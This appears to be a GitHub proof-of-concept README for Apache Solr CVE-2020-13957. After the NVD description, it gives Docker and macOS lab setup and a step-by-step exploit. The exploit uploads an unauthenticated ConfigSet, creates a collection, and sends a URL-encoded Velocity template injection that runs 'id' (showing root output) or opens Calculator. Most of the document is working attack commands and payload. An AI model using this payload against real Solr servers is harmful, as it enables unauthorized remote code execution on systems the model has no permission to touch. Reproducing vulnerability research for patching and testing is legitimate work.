# Apache Solr RCE CVE-2020-13957

**Docker Demo**

![docker-demo](https://user-images.githubusercontent.com/56715563/100495824-8cabfd00-3192-11eb-9874-960e3c0839fb.gif)

**Mac Demo**

![mac-demo](https://user-images.githubusercontent.com/56715563/100495858-d3015c00-3192-11eb-8813-46f94fa4f9c4.gif)

## NVD CVE-2020-13957 Description

NVD [CVE-2020-13957](https://nvd.nist.gov/vuln/detail/CVE-2020-13957)

```
Apache Solr versions 6.6.0 to 6.6.6, 7.0.0 to 7.7.3 and 8.0.0 to 8.6.2 prevents some features considered dangerous (which could be used for remote code execution) to be configured in a ConfigSet that's uploaded via API without authentication/authorization. The checks in place to prevent such features can be circumvented by using a combination of UPLOAD/CREATE actions.
```

## Docker

### Set up PoC environment

**1. Build an image from a Dockerfile**

```
$ docker build -t cve-2020-13957 .
```

**2. Run /bin/bash in a new container**

```
$ docker run --rm -p 8983:8983 --name cve-2020-13957 -it cve-2020-13957 /bin/bash
```

**3. Start Apache Solr Cloud in the container**

```
$ ./solr start -e cloud -noprompt -force
```

### Exploit

**1. Upload a ConfigSet**

Apache Solr Guide [Upload a ConfigSet](https://lucene.apache.org/solr/guide/8_2/configsets-api.html#configsets-api)

```
$ curl -X POST --header "Content-Type:application/octet-stream" --data-binary @myconfigset.zip "http://localhost:8983/solr/admin/configs?action=UPLOAD&name=myConfigSet"
```

**2. Create a Collection**

Apache Solr Guide [Create a Collection](https://lucene.apache.org/solr/guide/8_2/collection-management.html#create)

```
$ curl "http://localhost:8983/solr/admin/collections?action=CREATE&name=newCollection&numShards=2&replicationFactor=1&wt=xml&collection.configName=myConfigSet"
```

**3. Exec Id Command**

```
$ curl "http://localhost:8983/solr/newCollection/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set(%24x%3d%27%27)+%23set(%24rt%3d%24x.class.forName(%27java.lang.Runtime%27))+%23set(%24chr%3d%24x.class.forName(%27java.lang.Character%27))+%23set(%24str%3d%24x.class.forName(%27java.lang.String%27))+%23set(%24ex%3d%24rt.getRuntime().exec(%27id%27))+%24ex.waitFor()+%23set(%24out%3d%24ex.getInputStream())+%23foreach(%24i+in+%5b1..%24out.available()%5d)%24str.valueOf(%24chr.toChars(%24out.read()))%23end"
```

**Output**

```
     0  uid=0(root) gid=0(root) groups=0(root)
```

## Mac

### Set up PoC environment

**1. Download Apache Solr**

```
$ curl -OL https://archive.apache.org/dist/lucene/solr/8.2.0/solr-8.2.0.tgz
```

**2. Unzip**

```
$ tar -xzvf solr-8.2.0.tgz
```

**3. Start Apache Solr Cloud**

```
$ solr-8.2.0/bin/solr start -e cloud -noprompt -force
```

### Exploit

**1. Upload a ConfigSet**

Apache Solr Guide [Upload a ConfigSet](https://lucene.apache.org/solr/guide/8_2/configsets-api.html#configsets-api)

```
$ curl -X POST --header "Content-Type:application/octet-stream" --data-binary @myconfigset.zip "http://localhost:8983/solr/admin/configs?action=UPLOAD&name=myConfigSet"
```

**2. Create a Collection**

Apache Solr Guide [Create a Collection](https://lucene.apache.org/solr/guide/8_2/collection-management.html#create)

```
$ curl "http://localhost:8983/solr/admin/collections?action=CREATE&name=newCollection&numShards=2&replicationFactor=1&wt=xml&collection.configName=myConfigSet"
```

**3. Open Calc**

```
$ curl "http://localhost:8983/solr/newCollection/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set(%24x%3d%27%27)+%23set(%24rt%3d%24x.class.forName(%27java.lang.Runtime%27))+%23set(%24chr%3d%24x.class.forName(%27java.lang.Character%27))+%23set(%24str%3d%24x.class.forName(%27java.lang.String%27))+%23set(%24ex%3d%24rt.getRuntime().exec(%27open+-a+calculator%27))+%24ex.waitFor()+%23set(%24out%3d%24ex.getInputStream())+%23foreach(%24i+in+%5b1..%24out.available()%5d)%24str.valueOf(%24chr.toChars(%24out.read()))%23end"
```

## References

- https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957
